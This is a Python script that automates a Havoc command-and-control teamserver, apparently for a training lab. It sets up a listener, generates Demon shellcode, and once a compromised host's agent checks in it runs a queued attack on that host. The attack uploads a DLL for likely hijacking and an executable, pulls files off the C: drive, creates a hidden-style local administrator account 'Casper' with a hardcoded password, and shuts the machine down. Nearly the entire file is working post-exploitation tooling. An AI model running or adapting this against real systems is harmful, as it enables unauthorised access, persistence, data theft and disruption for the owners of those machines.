#!/usr/bin/env python3
"""End-to-end Havoc headless automation workflow helper.

The script provisions a listener, requests stageless shellcode, waits for the
resulting agent to check in, and then executes the training command queue one
task at a time. Command output and downloaded artefacts are mirrored to disk so
operators can audit every step after the run completes.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import dataclasses
import hashlib
import json
import os
import pathlib
import ssl
from datetime import datetime
from typing import Any, Dict, Iterable, List, Optional

import websockets


DEFAULT_TEAMSERVER = "wss://127.0.0.1:40056/havoc/"
DEFAULT_USERNAME = "operator"
DEFAULT_LISTENER_NAME = "training-http"
DEFAULT_ARTIFACT_DIR = pathlib.Path("artifacts")


INIT_TYPE = 0x1
INIT_SUCCESS = 0x1
INIT_ERROR = 0x2
INIT_OAUTH = 0x3
INIT_PROFILE = 0x5
LISTENER_TYPE = 0x2
LISTENER_ADD = 0x1
LISTENER_ERROR = 0x5
SESSION_TYPE = 0x7
SESSION_NEW = 0x1
SESSION_INPUT = 0x3
SESSION_OUTPUT = 0x4
GATE_TYPE = 0x5
GATE_STAGELESS = 0x2


@dataclasses.dataclass
class WorkflowStep:
    """Represents a single command queued to an agent."""

    name: str
    package: Dict[str, Any]
    expect_output: bool = True
    outfile: Optional[pathlib.Path] = None
    download: Optional[str] = None

    @property
    def command_id(self) -> str:
        return self.package["Body"]["Info"].get("CommandID", "")

    @property
    def task_id(self) -> str:
        return self.package["Body"]["Info"].get("TaskID", "")

    @property
    def command_line(self) -> str:
        return self.package["Body"]["Info"].get("CommandLine", "")


def timestamp() -> str:
    return datetime.utcnow().strftime("%m/%d/%Y %H:%M:%S")


def sha3(password: str) -> str:
    return hashlib.sha3_256(password.encode()).hexdigest()


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def read_file_b64(path: pathlib.Path) -> str:
    return b64(path.expanduser().read_bytes())


def make_package(event: int, subevent: int, info: Dict[str, Any], *, user: str, one_time: bool = False) -> Dict[str, Any]:
    head: Dict[str, Any] = {"Event": event, "User": user, "Time": timestamp()}
    if one_time:
        head["OneTime"] = "true"
    return {"Head": head, "Body": {"SubEvent": subevent, "Info": info}}


def make_task(user: str, agent_id: str, command_id: int, command_line: str, **fields: Any) -> WorkflowStep:
    task_id = os.urandom(4).hex()
    info: Dict[str, Any] = {
        "TaskID": task_id,
        "DemonID": agent_id,
        "CommandID": str(command_id),
        "CommandLine": command_line,
    }
    info.update(fields)
    package = make_package(SESSION_TYPE, SESSION_INPUT, info, user=user)
    return WorkflowStep(name=command_line or f"command-{command_id}", package=package)


def encode_ps(command: str) -> str:
    return (
        "0;FALSE;TRUE;C:\\\Windows\\\System32\\\WindowsPowerShell\\\v1.0\\\powershell.exe;"
        + b64(command.encode())
    )


def encode_path(path: str) -> str:
    return b64(path.encode("utf-8"))


@dataclasses.dataclass
class WorkflowConfig:
    teamserver: str = DEFAULT_TEAMSERVER
    username: str = DEFAULT_USERNAME
    password: str = ""
    listener_name: str = DEFAULT_LISTENER_NAME
    listener_bind: str = "0.0.0.0"
    listener_port: int = 8443
    listener_hosts: Iterable[str] = dataclasses.field(default_factory=lambda: ["0.0.0.0"])
    artifact_dir: pathlib.Path = DEFAULT_ARTIFACT_DIR
    shellcode_path: pathlib.Path = dataclasses.field(default_factory=lambda: DEFAULT_ARTIFACT_DIR / "demon.x64.bin")
    local_dll: pathlib.Path = pathlib.Path("/home/kali/WptsExtensions.dll")
    local_exe: pathlib.Path = pathlib.Path("/home/kali/summon.exe")
    remote_dll: str = r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\WptsExtensions.dll"
    remote_exe: str = r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\summon.exe"

    def artifact(self, *parts: str) -> pathlib.Path:
        return self.artifact_dir.joinpath(*parts)


def listener_payload(cfg: WorkflowConfig) -> Dict[str, Any]:
    hosts = ", ".join(cfg.listener_hosts)
    info = {
        "Name": cfg.listener_name,
        "Protocol": "HTTP",
        "Status": "online",
        "Secure": "false",
        "Hosts": hosts,
        "HostBind": cfg.listener_bind,
        "HostRotation": "Round-Robin",
        "PortBind": str(cfg.listener_port),
        "PortConn": str(cfg.listener_port),
        "Headers": "Server: training",
        "Uris": "/,/health",
        "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "HostHeader": "training.local",
        "Proxy Enabled": "false",
    }
    return make_package(LISTENER_TYPE, LISTENER_ADD, info, user=cfg.username)


def gate_payload(cfg: WorkflowConfig, config_json: str) -> Dict[str, Any]:
    info = {
        "AgentType": "Demon",
        "Listener": cfg.listener_name,
        "Arch": "x64",
        "Format": "Windows Shellcode",
        "Config": config_json,
    }
    return make_package(GATE_TYPE, GATE_STAGELESS, info, user=cfg.username, one_time=True)


def build_workflow(cfg: WorkflowConfig, agent_id: str) -> List[WorkflowStep]:
    steps: List[WorkflowStep] = []

    def append(step: WorkflowStep, *, name: Optional[str] = None, **extras: Any) -> None:
        if name:
            step.name = name
        for key, value in extras.items():
            setattr(step, key, value)
        steps.append(step)

    append(
        make_task(
            cfg.username,
            agent_id,
            0x1010,
            "powershell [System.Environment]::GetEnvironmentVariable('Path','Machine')",
            ProcCommand="4",
            Args=encode_ps("[System.Environment]::GetEnvironmentVariable('Path','Machine')"),
        ),
        name="machine_path",
        outfile=cfg.artifact("machine-path.txt"),
    )

    append(
        make_task(
            cfg.username,
            agent_id,
            0x1010,
            "powershell [System.Environment]::GetEnvironmentVariable('Path','User')",
            ProcCommand="4",
            Args=encode_ps("[System.Environment]::GetEnvironmentVariable('Path','User')"),
        ),
        name="user_path",
        outfile=cfg.artifact("user-path.txt"),
    )

    append(
        make_task(
            cfg.username,
            agent_id,
            15,
            f"upload {cfg.local_dll} {cfg.remote_dll}",
            SubCommand="upload",
            Arguments=encode_path(cfg.remote_dll),
            File=read_file_b64(cfg.local_dll),
        ),
        name="upload_wpts",
    )

    append(
        make_task(
            cfg.username,
            agent_id,
            15,
            f"upload {cfg.local_exe} {cfg.remote_exe}",
            SubCommand="upload",
            Arguments=encode_path(cfg.remote_exe),
            File=read_file_b64(cfg.local_exe),
        ),
        name="upload_summon",
    )

    for name, remote in [
        ("download_samantha", r"C:\\samantha.txt"),
        ("download_systemic", r"C:\\systemic.txt"),
        ("download_security", r"C:\\security.txt"),
    ]:
        append(
            make_task(
                cfg.username,
                agent_id,
                15,
                f"download {remote}",
                SubCommand="download",
                Arguments=encode_path(remote),
            ),
            name=name,
            download=remote,
        )

    append(
        make_task(
            cfg.username,
            agent_id,
            0x1010,
            "powershell net user Casper IamAGhost12345!!! /add",
            ProcCommand="4",
            Args=encode_ps("net user Casper IamAGhost12345!!! /add"),
        ),
        name="add_user",
    )

    append(
        make_task(
            cfg.username,
            agent_id,
            0x1010,
            "powershell net localgroup Administrators Casper /add",
            ProcCommand="4",
            Args=encode_ps("net localgroup Administrators Casper /add"),
        ),
        name="add_to_admins",
    )

    append(
        make_task(
            cfg.username,
            agent_id,
            0x1010,
            "powershell Stop-Computer",
            ProcCommand="4",
            Args=encode_ps("Stop-Computer"),
        ),
        name="stop_computer",
        expect_output=False,
    )

    return steps


async def authenticate(ws: websockets.WebSocketClientProtocol, cfg: WorkflowConfig) -> None:
    request = make_package(
        INIT_TYPE,
        INIT_OAUTH,
        {"User": cfg.username, "Password": sha3(cfg.password)},
        user=cfg.username,
    )
    await ws.send(json.dumps(request))


async def maybe_queue_next(ws: websockets.WebSocketClientProtocol, agent_id: Optional[str], workflow: List[WorkflowStep], *,
                            current_step: Optional[WorkflowStep]) -> Optional[WorkflowStep]:
    while agent_id and current_step is None and workflow:
        current_step = workflow.pop(0)
        current_step.package["Head"]["Time"] = timestamp()
        print(f"[>] queued {current_step.name}: {current_step.command_line}")
        await ws.send(json.dumps(current_step.package))
        if not current_step.expect_output:
            print(f"[!] {current_step.name} does not return output; continuing")
            current_step = None
    return current_step


def ensure_artifact_dir(cfg: WorkflowConfig) -> None:
    cfg.artifact_dir.mkdir(parents=True, exist_ok=True)


async def workflow_runner(cfg: WorkflowConfig) -> None:
    ensure_artifact_dir(cfg)

    ssl_context: Optional[ssl.SSLContext] = None
    if cfg.teamserver.startswith("wss://"):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

    async with websockets.connect(cfg.teamserver, ssl=ssl_context) as ws:
        await authenticate(ws, cfg)

        listener_sent = False
        listener_ready = False
        payload_requested = False
        payload_saved = False
        profile_json = ""
        seen_agents: set[str] = set()
        baseline_agents: set[str] = set()
        agent_id: Optional[str] = None
        workflow: List[WorkflowStep] = []
        current_step: Optional[WorkflowStep] = None
        workflow_done = False

        while True:
            message = json.loads(await ws.recv())
            head = message.get("Head", {})
            body = message.get("Body", {})
            event = head.get("Event")
            subevent = body.get("SubEvent")
            info = body.get("Info", {})

            if event == INIT_TYPE:
                if subevent == INIT_SUCCESS:
                    print(f"[+] authenticated as {cfg.username}")
                    if not listener_sent:
                        pkg = listener_payload(cfg)
                        pkg["Head"]["Time"] = timestamp()
                        await ws.send(json.dumps(pkg))
                        listener_sent = True
                        print(f"[>] requested listener {cfg.listener_name}")
                elif subevent == INIT_ERROR:
                    raise RuntimeError(f"authentication failed: {info.get('Message', 'unknown error')}")
                elif subevent == INIT_PROFILE:
                    profile_json = info.get("Demon", "")
                    print(f"[+] received profile template ({len(profile_json)} bytes)")
                    if listener_ready and not payload_requested:
                        pkg = gate_payload(cfg, profile_json)
                        pkg["Head"]["Time"] = timestamp()
                        await ws.send(json.dumps(pkg))
                        payload_requested = True
                        print("[>] requested shellcode build")
            elif event == LISTENER_TYPE:
                name = info.get("Name") or info.get("ListenerName")
                status = info.get("Status", "")
                if subevent == LISTENER_ADD and name == cfg.listener_name:
                    print(f"[+] listener {name} -> {status}")
                    if status.lower() == "online":
                        listener_ready = True
                        if profile_json and not payload_requested:
                            pkg = gate_payload(cfg, profile_json)
                            pkg["Head"]["Time"] = timestamp()
                            await ws.send(json.dumps(pkg))
                            payload_requested = True
                            print("[>] requested shellcode build")
                elif subevent == LISTENER_ERROR and name == cfg.listener_name:
                    raise RuntimeError(info.get("Error", "listener error"))
            elif event == GATE_TYPE and subevent == GATE_STAGELESS:
                if "PayloadArray" in info:
                    data = base64.b64decode(info["PayloadArray"])
                    cfg.shellcode_path.parent.mkdir(parents=True, exist_ok=True)
                    cfg.shellcode_path.write_bytes(data)
                    payload_saved = True
                    baseline_agents = set(seen_agents)
                    print(f"[+] saved shellcode to {cfg.shellcode_path} ({len(data)} bytes)")
                    print("[*] execute the payload on the target to register a new agent")
                elif "Message" in info:
                    print(f"[builder] {info.get('MessageType', 'Info')}: {info['Message']}")
            elif event == SESSION_TYPE:
                if subevent == SESSION_NEW:
                    name = info.get("NameID")
                    if name:
                        seen_agents.add(name)
                        if payload_saved and agent_id is None and name not in baseline_agents:
                            agent_id = name
                            print(f"[+] new agent registered: {agent_id}")
                            workflow = build_workflow(cfg, agent_id)
                            current_step = await maybe_queue_next(ws, agent_id, workflow, current_step=current_step)
                elif subevent == SESSION_OUTPUT and agent_id and info.get("DemonID") == agent_id:
                    if not current_step or info.get("CommandID") != current_step.command_id:
                        continue

                    output_data = base64.b64decode(info.get("Output", ""))
                    text = output_data.decode("utf-8", errors="ignore")

                    if current_step.download:
                        try:
                            callback = json.loads(text)
                        except json.JSONDecodeError:
                            if text.strip():
                                print(f"[{current_step.name}] {text.strip()}")
                            continue

                        if callback.get("MiscType") == "download" and "MiscData" in callback:
                            content = base64.b64decode(callback["MiscData"])
                            remote_name_b64 = callback.get("MiscData2", "").split(";", 1)[0]
                            if remote_name_b64:
                                remote_name = base64.b64decode(remote_name_b64).decode("utf-8", errors="ignore")
                            else:
                                remote_name = current_step.download
                            out_path = cfg.artifact(remote_name.split("\\")[-1])
                            out_path.write_bytes(content)
                            print(f"[+] downloaded {remote_name} -> {out_path}")
                            current_step = await maybe_queue_next(ws, agent_id, workflow, current_step=None)
                        else:
                            if "Message" in callback:
                                print(f"[{current_step.name}] {callback['Message']}")
                    else:
                        if current_step.outfile:
                            current_step.outfile.parent.mkdir(parents=True, exist_ok=True)
                            current_step.outfile.write_text(text, encoding="utf-8")
                            print(f"[+] wrote output to {current_step.outfile}")
                        elif text.strip():
                            try:
                                structured = json.loads(text)
                            except json.JSONDecodeError:
                                print(f"[{current_step.name}] {text.strip()}")
                            else:
                                if "Message" in structured:
                                    print(f"[{current_step.name}] {structured['Message']}")
                                else:
                                    print(f"[{current_step.name}] {text.strip()}")
                        current_step = await maybe_queue_next(ws, agent_id, workflow, current_step=None)

            if agent_id and not workflow and current_step is None and not workflow_done:
                workflow_done = True
                print("[*] command workflow finished")
                break

        if not payload_saved:
            raise RuntimeError("shellcode was not generated; check listener or profile handling")


def parse_args() -> WorkflowConfig:
    parser = argparse.ArgumentParser(description="Automate Havoc headless workflows")
    parser.add_argument("--teamserver", default=DEFAULT_TEAMSERVER, help="WebSocket URI of the teamserver")
    parser.add_argument("--username", default=DEFAULT_USERNAME, help="Operator username")
    parser.add_argument("--password", default=os.getenv("HAVOC_PASSWORD", ""), help="Operator password")
    parser.add_argument("--listener-name", default=DEFAULT_LISTENER_NAME, help="Listener to create or update")
    parser.add_argument("--listener-bind", default="0.0.0.0", help="Listener bind address")
    parser.add_argument("--listener-port", type=int, default=8443, help="Listener bind/connect port")
    parser.add_argument("--listener-host", action="append", dest="listener_hosts", default=None,
                        help="Hosts value to advertise (repeatable)")
    parser.add_argument("--artifact-dir", type=pathlib.Path, default=DEFAULT_ARTIFACT_DIR,
                        help="Directory for workflow artefacts")
    parser.add_argument("--shellcode-path", type=pathlib.Path,
                        default=DEFAULT_ARTIFACT_DIR / "demon.x64.bin",
                        help="Destination path for generated shellcode")
    parser.add_argument("--local-dll", type=pathlib.Path, default=pathlib.Path("/home/kali/WptsExtensions.dll"),
                        help="Local DLL to upload during the workflow")
    parser.add_argument("--local-exe", type=pathlib.Path, default=pathlib.Path("/home/kali/summon.exe"),
                        help="Local EXE to upload during the workflow")
    parser.add_argument("--remote-dll", default=r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\WptsExtensions.dll",
                        help="Remote DLL path for the upload step")
    parser.add_argument("--remote-exe", default=r"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\summon.exe",
                        help="Remote EXE path for the upload step")
    args = parser.parse_args()

    listener_hosts = args.listener_hosts or ["0.0.0.0"]
    return WorkflowConfig(
        teamserver=args.teamserver,
        username=args.username,
        password=args.password,
        listener_name=args.listener_name,
        listener_bind=args.listener_bind,
        listener_port=args.listener_port,
        listener_hosts=listener_hosts,
        artifact_dir=args.artifact_dir,
        shellcode_path=args.shellcode_path,
        local_dll=args.local_dll,
        local_exe=args.local_exe,
        remote_dll=args.remote_dll,
        remote_exe=args.remote_exe,
    )


async def main_async(cfg: WorkflowConfig) -> None:
    if not cfg.password:
        raise RuntimeError("no password provided; use --password or HAVOC_PASSWORD")
    try:
        await workflow_runner(cfg)
    except FileNotFoundError as exc:
        raise RuntimeError(f"required file not found: {exc.filename}") from exc


def main() -> None:
    cfg = parse_args()
    asyncio.run(main_async(cfg))


if __name__ == "__main__":
    main()
